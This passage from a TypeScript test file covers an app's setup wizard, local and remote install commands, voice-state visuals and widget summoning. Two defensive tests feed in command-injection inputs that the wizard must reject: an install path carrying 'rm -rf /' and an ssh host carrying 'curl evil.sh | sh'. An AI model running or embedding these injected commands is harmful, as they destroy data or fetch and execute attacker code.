      ;(window as any).WebSocket = fakeWsClass(sockets)
      const invoke = stubCore(() => undefined)

      W().open()
      W().goTo('connect')
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://nowhere:4753/ui'

      const firstClick = W().finish()
      sockets[0].onclose({ code: 1006 })
      await firstClick

      // Refused ⇒ nothing saved, button now offers the explicit override.
      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
      const finishBtn = document.getElementById('wizard-finish-btn')!
      expect(finishBtn.textContent).toBe('Save anyway')
      expect(activeStep()).toBe('connect')

      await W().finish()   // second click: forceSave skips the probe
      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeTruthy()
      expect(activeStep()).toBe('done')
      // Guard resets for the next visitor of the step.
      expect(finishBtn.textContent).toBe('Save & finish')
    })

    it('Scenario: a first frame that is NOT hello reads as "not Luna", never success', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)

      W().open()
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://some-other-service/ws'
      const testPromise = W().runConnectTest()
      sockets[0].onmessage({ data: JSON.stringify({ type: 'thread-list', threads: [] }) })
      const ok = await testPromise
      expect(ok).toBe(false)
      const status = document.getElementById('wizard-connect-status')!
      expect(status.classList.contains('fail')).toBe(true)
      expect(status.textContent).toContain('doesn’t sound like Luna')
    })

    it('Scenario: fresh Mac -> install runs the real steps in order and starts the server', async () => {
      const commands: string[] = []
      let healthzCalls = 0
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        commands.push(c)
        if (c.includes('healthz')) {
          healthzCalls++
          // 1st = detection probe (no server), 2nd = wake-step probe (still
          // none → must start), 3rd+ = heartbeat after start (alive).
          return { exitCode: healthzCalls >= 3 ? 0 : 1, stdout: '', stderr: '', durationMs: 4, timedOut: false }
        }
        if (c.includes('"$HOME/luna/.git" ]')) {
          return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false } // no repo yet
        }
        return { exitCode: 0, stdout: 'ok', stderr: '', durationMs: 5, timedOut: false }
      })

      W().open()
      await W()._detectPromise
      expect(W().env).toEqual({ serverRunning: false, repoExists: false })
      // Fresh Mac → no detection banner, install wording.
      expect((document.getElementById('wizard-detect-note') as HTMLElement).hidden).toBe(true)
      expect(document.getElementById('wizard-local-start')!.textContent).toBe('Install & start')

      W().choosePath('local')
      await W().runLocalInstall()

      expect(activeStep()).toBe('progress')
      // Order of operations (after the 2 detection probes): git check → bun
      // check → clone → bun install → ~/.luna seed → wake probe → start → heartbeat.
      const install = commands.slice(2)
      expect(install[0]).toContain('command -v git')
      expect(install[1]).toContain('command -v bun')
      expect(install[2]).toContain('git clone https://github.com/fourcolors/luna.git')
      expect(install[2]).toContain('LUNA_DIR="$HOME/luna"')   // ~ expanded by the SHELL
      expect(install[3]).toContain('bun install')
      expect(install[4]).toContain('LUNA_REPO_ROOT')
      // UI_WS_TOKEN is a HARD boot requirement (resolveUiWsToken throws) — a
      // fresh install must mint one or the launchd server crash-loops and the
      // heartbeat times out. Existing tokens are preserved (grep -q guard).
      expect(install[4]).toContain('grep -q "^UI_WS_TOKEN="')
      expect(install[4]).toContain('openssl rand -hex 24')
      // Every command gets the PATH prelude (a .app inherits launchd's PATH).
      for (const c of commands) expect(c).toContain('$HOME/.bun/bin')

      // No server answered the wake probe ⇒ the supervised start actually ran:
      // the shared plist lib is sourced, the plist lands where launchd rescans
      // at login (survives reboot), and bootstrap+kickstart bring her up.
      const wake = commands.find((c) => c.includes('launchctl bootstrap'))!
      expect(wake).toBeTruthy()
      expect(wake).toContain('scripts/lib/launchd-plist.sh')
      expect(wake).toContain('Library/LaunchAgents')
      expect(wake).toContain('com.user.luna-chat-server')
      expect(wake).toContain('launchctl kickstart')
      // The unsupervised nohup start is gone for good.
      expect(commands.some((c) => c.includes('nohup'))).toBe(false)
      // Fresh install never pauses an old server.
      expect(commands.some((c) => c.includes('pkill'))).toBe(false)

      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
      expect(rows).toHaveLength(7)
      expect(rows.every((r) => r.classList.contains('ok'))).toBe(true)
      expect((document.getElementById('wizard-progress-next') as HTMLElement).hidden).toBe(false)
    })

    it('Scenario: Luna already lives here -> update mode (settle-pause + restart, update wording, connect shortcut)', async () => {
      const commands: string[] = []
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        commands.push(c)
        return { exitCode: 0, stdout: 'ok', stderr: '', durationMs: 5, timedOut: false } // server up, repo present
      })

      W().open()
      await W()._detectPromise
      expect(W().env).toEqual({ serverRunning: true, repoExists: true })

      // The path step announces the find; the local step speaks "update".
      const note = document.getElementById('wizard-detect-note') as HTMLElement
      expect(note.hidden).toBe(false)
      expect(note.textContent).toContain('already running')
      expect(document.getElementById('wizard-path-local-desc')!.textContent).toContain('update')

      W().choosePath('local')
      expect(document.getElementById('wizard-local-title')!.textContent).toContain('Update Luna')
      expect(document.getElementById('wizard-local-start')!.textContent).toBe('Update & restart')
      expect((document.getElementById('wizard-local-connect') as HTMLElement).hidden).toBe(false)

      await W().runLocalInstall()

      // Update flow: pull (not a fresh clone path choice — same command, repo
      // branch wins), settle-pause the old server, then a supervised restart.
      // The pause MUST bootout the LaunchAgent BEFORE the 6s settle (else
      // KeepAlive respawns the old server mid-settle) and still pkill-sweeps
      // legacy nohup-era servers.
      const pause = commands.find((c) => c.includes('sleep 6'))!
      expect(pause).toBeTruthy()
      expect(pause.indexOf('launchctl bootout')).toBeGreaterThanOrEqual(0)
      expect(pause.indexOf('launchctl bootout')).toBeLessThan(pause.indexOf('sleep 6'))
      expect(pause).toContain('pkill -f "ui-web.*server:chat"')
      expect(commands.some((c) => c.includes('launchctl bootstrap') && c.includes('launchctl kickstart'))).toBe(true)
      expect(commands.some((c) => c.includes('nohup'))).toBe(false)

      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
      expect(rows).toHaveLength(8)                            // + "Tucking the old Luna in"
      expect(rows.every((r) => r.classList.contains('ok'))).toBe(true)
    })

    it('Scenario: "Just connect to it" shortcut jumps to connect prefilled with localhost', async () => {
      stubCore((cmd) => (cmd === 'local_shell_exec'
        ? { exitCode: 0, stdout: '', stderr: '', durationMs: 2, timedOut: false }
        : undefined))
      W().open()
      await W()._detectPromise
      W().choosePath('local')
      const shortcut = document.getElementById('wizard-local-connect') as HTMLElement
      expect(shortcut.hidden).toBe(false)
      shortcut.click()
      expect(activeStep()).toBe('connect')
      expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
        .toBe('ws://127.0.0.1:4753/ui')

      // Back from here must return to the local FORM, not an empty progress
      // screen — no install run ever happened on this path.
      document.getElementById('wizard-connect-back')!.click()
      expect(activeStep()).toBe('local')
    })

    it('Scenario: local install failure paints the bead red, shows the log, and offers Back', async () => {
      stubCore((cmd) => {
        if (cmd !== 'local_shell_exec') return undefined
        return { exitCode: 1, stdout: '', stderr: 'sh: git: command not found', durationMs: 3, timedOut: false }
      })

      W().open()
      W().choosePath('local')
      await W().runLocalInstall()

      const rows = Array.from(document.querySelectorAll('#wizard-progress-list .wizard-task'))
      expect(rows[0].classList.contains('fail')).toBe(true)
      expect(rows[1].classList.contains('ok')).toBe(false)   // never reached
      const log = document.getElementById('wizard-progress-log') as HTMLElement
      expect(log.hidden).toBe(false)
      expect(log.textContent).toContain('git: command not found')
      expect((document.getElementById('wizard-progress-back') as HTMLElement).hidden).toBe(false)
      expect((document.getElementById('wizard-progress-next') as HTMLElement).hidden).toBe(true)
    })

    it('Scenario: a hostile install folder is rejected before any install command runs', async () => {
      const invoke = stubCore(() => ({ exitCode: 0, stdout: '', stderr: '', durationMs: 1, timedOut: false }))
      W().open()
      await W()._detectPromise                               // detection probes are read-only
      W().choosePath('local')
      ;(document.getElementById('wizard-local-dir') as HTMLInputElement).value = '~/luna"; rm -rf /; "'
      await W().runLocalInstall()
      // No mutating install command ever reached the shell (detection's two
      // read-only probes are the only local_shell_exec calls).
      const shellCmds = invoke.mock.calls
        .filter((c: any[]) => c[0] === 'local_shell_exec')
        .map((c: any[]) => c[1].command as string)
      expect(shellCmds.some((c) => c.includes('git clone') || c.includes('launchctl') || c.includes('mkdir'))).toBe(false)
      expect(activeStep()).toBe('local')                     // still on the form
    })

    it('Scenario: arriving at connect on the local path reads UI_WS_TOKEN into the secret field', async () => {
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        if (c.includes('grep "^UI_WS_TOKEN=')) {
          return { exitCode: 0, stdout: 'UI_WS_TOKEN=tok_abc123456789\n', stderr: '', durationMs: 2, timedOut: false }
        }
        return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false }
      })
      W().open()
      W().chosenPath = 'local'
      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
      tokenInput.value = ''
      W().goTo('connect')
      for (let i = 0; i < 6; i++) await Promise.resolve()
      expect(tokenInput.value).toBe('tok_abc123456789')
    })

    it('Scenario: a token the user already typed is never overwritten by the .env read', async () => {
      stubCore((cmd, args) => {
        if (cmd !== 'local_shell_exec') return undefined
        const c = args.command as string
        if (c.includes('grep "^UI_WS_TOKEN=')) {
          return { exitCode: 0, stdout: 'UI_WS_TOKEN=from-env-file\n', stderr: '', durationMs: 2, timedOut: false }
        }
        return { exitCode: 1, stdout: '', stderr: '', durationMs: 1, timedOut: false }
      })
      W().open()
      W().chosenPath = 'local'
      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
      tokenInput.value = 'my-own-secret'
      W().goTo('connect')
      for (let i = 0; i < 6; i++) await Promise.resolve()
      expect(tokenInput.value).toBe('my-own-secret')
    })

    it('Scenario: remote step writes a tailored install one-liner and prefills the connect URL', () => {
      stubCore(() => undefined)
      W().open()
      W().choosePath('remote')

      const host = document.getElementById('wizard-remote-host') as HTMLInputElement
      host.value = 'root@moonbase'
      host.dispatchEvent(new Event('input', { bubbles: true }))

      const cmd = document.getElementById('wizard-remote-cmd')!.textContent!
      expect(cmd).toContain('ssh -t root@moonbase')
      expect(cmd).toContain('git clone https://github.com/fourcolors/luna.git')
      expect(cmd).toContain('luna-server-install')
      expect(cmd).toContain('UI_WS_TOKEN')                   // surfaces the token to paste back

      document.getElementById('wizard-remote-continue')!.click()
      expect(activeStep()).toBe('connect')
      expect((document.getElementById('wizard-connect-url') as HTMLInputElement).value)
        .toBe('ws://moonbase:4753/ui')                       // user@ stripped, ws guessed
    })

    it('Scenario: an ssh destination with quotes/spaces never reaches the generated one-liner', () => {
      stubCore(() => undefined)
      W().open()
      W().choosePath('remote')

      const host = document.getElementById('wizard-remote-host') as HTMLInputElement
      host.value = `bad host'; curl evil.sh | sh; '`
      host.dispatchEvent(new Event('input', { bubbles: true }))

      const cmd = document.getElementById('wizard-remote-cmd')!.textContent!
      expect(cmd).toContain('ssh -t user@your-server')       // placeholder fallback
      expect(cmd).not.toContain('evil.sh')
      expect(W()._remoteWsGuess).toBe('')                    // no bogus prefill either
    })

    // The wizard re-entry button (#open-wizard-btn) moved to the standalone
    // Connection panel — its wiring is covered in test/panel-connection.test.ts.
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Voice — the hub's two remaining voice jobs (Phase 6):
  // boot-arming the Rust pipeline from persisted settings (hands-free must work
  // with no widgets open) and the moon's data-voice-state watercolor visuals.
  // The mic button, transcript routing and spoken-reply pipeline live in the
  // chat window (test/chat-window.test.ts); the controls live in the voice
  // panel (test/panel-voice.test.ts).
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Voice state -> moon visuals (data-voice-state)', () => {
    const V = () => (window as any).__MoonInternals.VoiceEngine

    it('Scenario: listening sets dataset.voiceState and the --voice-level CSS var (clamped)', () => {
      const wrapper = document.getElementById('moon-wrapper')!
      V().onStateEvent({ state: 'listening', mode: 'auto', level: 0.5 })
      expect(wrapper.dataset.voiceState).toBe('listening')
      expect(wrapper.style.getPropertyValue('--voice-level')).toBe('0.5')
      V().onStateEvent({ state: 'listening', mode: 'auto', level: 3 })
      expect(wrapper.style.getPropertyValue('--voice-level')).toBe('1')
    })

    it('Scenario: transcribing and speaking map through; off clears to ""', () => {
      const wrapper = document.getElementById('moon-wrapper')!
      V().onStateEvent({ state: 'transcribing', mode: 'auto' })
      expect(wrapper.dataset.voiceState).toBe('transcribing')
      V().onStateEvent({ state: 'speaking', mode: 'auto' })
      expect(wrapper.dataset.voiceState).toBe('speaking')
      V().onStateEvent({ state: 'off', mode: 'off' })
      expect(wrapper.dataset.voiceState).toBe('')
    })
  })

  describe('Feature: Voice availability + boot wiring (hub pipeline arming)', () => {
    const M = () => (window as any).__MoonInternals

    it('Scenario: without a Tauri voice backend the hub degrades (engine unavailable)', () => {
      // The shared beforeEach has no __TAURI__.core: VoiceEngine.init() lands
      // in "unavailable" synchronously at boot.
      expect(M().VoiceEngine.available).toBe(false)
    })

    it('Scenario: a Rust core whose voice_status REJECTS (older build) degrades silently, no throw', async () => {
      const invoke = vi.fn().mockRejectedValue(new Error('unknown command voice_status'))
      ;(window as any).__TAURI__.core = { invoke }
      await M().VoiceEngine.init()
      expect(M().VoiceEngine.available).toBe(false)
      // Only the probe was attempted — no follow-up voice commands to spam.
      expect(invoke.mock.calls.map((c) => c[0])).toEqual(['voice_status'])
    })

    it('Scenario: with a voice backend, boot re-applies persisted settings and subscribes ONLY voice-state', async () => {
      localStorage.setItem('luna_voice_mode', 'auto')
      localStorage.setItem('luna_voice_silence_hang_ms', '800')
      const handlers: Record<string, (e: any) => void> = {}
      const invoke = vi.fn(async (cmd: string) => {
        if (cmd === 'voice_status') return { state: 'idle', mode: 'off', modelPresent: true }
        return null
      })
      const listen = vi.fn(async (name: string, cb: any) => { handlers[name] = cb; return () => {} })
      ;(window as any).__TAURI__.core = { invoke }
      ;(window as any).__TAURI__.event = { listen }

      await M().VoiceEngine.init()

      expect(invoke).toHaveBeenCalledWith('voice_status')
      expect(invoke).toHaveBeenCalledWith('voice_set_mode', { mode: 'auto' })
      expect(invoke).toHaveBeenCalledWith('voice_set_config', { silenceHangMs: 800 })
      // Phase 6: the hub paints the moon only — transcripts / errors / model
      // progress are the chat window's and voice panel's listeners.
      expect(Object.keys(handlers)).toEqual(['voice-state'])

      // A captured voice-state event drives the moon visual.
      handlers['voice-state']({ payload: { state: 'listening', mode: 'auto', level: 0.4 } })
      expect(document.getElementById('moon-wrapper')!.dataset.voiceState).toBe('listening')
    })

    it('Scenario: a stored out-of-range silence hang is clamped before reaching the Rust core', async () => {
      localStorage.setItem('luna_voice_silence_hang_ms', '99999')
      const invoke = vi.fn().mockResolvedValue(null)
      ;(window as any).__TAURI__.core = { invoke }
      await M().VoiceEngine.applyPersisted()
      expect(invoke).toHaveBeenCalledWith('voice_set_config', { silenceHangMs: 1200 })
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: ambient ladder + summon-by-name (hub-scope, Phase 5)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: needs-input pip (ambient ladder rung 1)', () => {
    const M = () => (window as any).__MoonInternals

    it('job-input-request lights the pip and summons the NOW rail; status clears it', async () => {
      const m = M()
      const invoke = vi.fn(async () => 'panel-now')
      ;(window as any).__TAURI__.core = { invoke }
      const pip = document.getElementById('needs-input-pip') as HTMLElement
      expect(pip.hidden).toBe(true)

      m.WebSocketEngine.handleFrame({
        type: 'job-input-request', requestId: 'jin_1', runId: 7,
        jobId: 'job-x', jobName: 'Nightly sweep', prompt: 'Continue?', timeoutMs: 300000,
      })
      expect(pip.hidden).toBe(false)
      await vi.waitFor(() => expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'now' }))

      // A second request keeps it lit; settling ONE leaves the other.
      m.WebSocketEngine.handleFrame({
        type: 'job-input-request', requestId: 'jin_2', runId: 8,
        jobId: 'job-y', jobName: 'Other', prompt: 'Go?', timeoutMs: 300000,
      })
      m.WebSocketEngine.handleFrame({ type: 'job-input-status', requestId: 'jin_1', ok: true, message: 'Answered.' })
      expect(pip.hidden).toBe(false)
      m.WebSocketEngine.handleFrame({ type: 'job-input-status', requestId: 'jin_2', ok: false, message: 'Timed out.' })
      expect(pip.hidden).toBe(true)
    })

    it('malformed frames never light the pip', () => {
      const m = M()
      const pip = document.getElementById('needs-input-pip') as HTMLElement
      m.WebSocketEngine.handleFrame({ type: 'job-input-request' })
      expect(pip.hidden).toBe(true)
    })
  })

  describe('Feature: Summon-by-name (widget directory + widget-open)', () => {
    const M = () => (window as any).__MoonInternals

    it('hello announces the widget directory from the shipped registry', async () => {
      const m = M()
      const sent: any[] = []
      m.WebSocketEngine.send = (f: any) => { sent.push(f) }
      m.State.ws = { readyState: WebSocket.OPEN }
      // The harness has no network: serve the real registry file via a fetch mock.
      const registry = JSON.parse(
        fs.readFileSync(path.resolve(__dirname, '../frontend/vendor/widget-registry.json'), 'utf8'))
      ;(window as any).fetch = vi.fn(async () => ({ json: async () => registry }))

      m.WebSocketEngine.handleFrame({
        type: 'hello', protocolVersion: 2, kinds: [],
        capabilities: { chat: true, streamingDeltas: true },
      })
      await vi.waitFor(() => expect(sent.some((f) => f.type === 'widget-directory')).toBe(true))
      const dir = sent.find((f) => f.type === 'widget-directory')
      expect(dir.widgets.map((w: any) => w.kind)).toContain('settings.voice')
      expect(dir.widgets.every((w: any) => typeof w.description === 'string')).toBe(true)
      delete (window as any).fetch
    })

    it('widget-open dispatches to the Rust open_widget command (registry-validated there)', async () => {
      const m = M()
      const invoke = vi.fn(async () => 'panel-settings-voice')
      ;(window as any).__TAURI__.core = { invoke }
      m.WebSocketEngine.handleFrame({ type: 'widget-open', kind: 'settings.voice' })
      await vi.waitFor(() =>
        expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'settings.voice' }))
      // Malformed frames never reach invoke.
      invoke.mockClear()
      m.WebSocketEngine.handleFrame({ type: 'widget-open' })
      expect(invoke).not.toHaveBeenCalled()
    })
  })
})
